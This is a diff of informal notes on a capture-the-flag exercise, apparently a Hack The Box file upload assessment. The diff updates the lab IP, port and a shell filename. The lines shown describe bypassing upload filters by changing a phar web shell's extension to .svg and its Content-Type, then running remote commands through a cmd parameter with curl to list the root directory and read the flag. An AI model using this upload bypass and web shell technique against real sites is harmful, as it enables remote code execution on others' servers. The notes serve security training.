@@ -6,7 +6,7 @@ Try to utilize what you learned in this module to understand how the upload form
 Extra Exercise
 Try to note down the main security issues found with the web application and the necessary security measures to mitigate these issues and prevent further exploitation.
 
-CHALLENGE: 94.237.54.190:41654
+CHALLENGE: 94.237.51.163:57462
 
 ** this one was.... confusing ngllllllllllll : ] ***!! 
 
@@ -112,9 +112,9 @@ EOF
 24) upload new phar.jpeg shell and intercept it 
 25) Within the intercepted request, we need to change back the extension to .svg for filename and make Content-Type to be image/svg+xml:
 26) NOW FORWARD THE CHANGED REQUEST DONT SEND TO REPEATER OR ANYTHING JUST FWDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD 
-27) curl -s http://94.237.54.190:41654/contact/user_feedback_submissions/250314_shell.phar.svg?cmd=ls+/
+27) curl -s http://94.237.51.163:57462/contact/user_feedback_submissions/250414_shell.phar.svg?cmd=ls+/
 28) we see the flag from the output -> flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
-29) change curl command to -> curl -s http://94.237.54.190:41654/contact/user_feedback_submissions/250314_shell.phar.svg?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
+29) change curl command to -> curl -s http://94.237.51.163:57462/contact/user_feedback_submissions/250414_shell.phar.svg?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
 Output: &xxe; HTB{m4573r1ng_upl04d_3xpl0174710n}
 
 
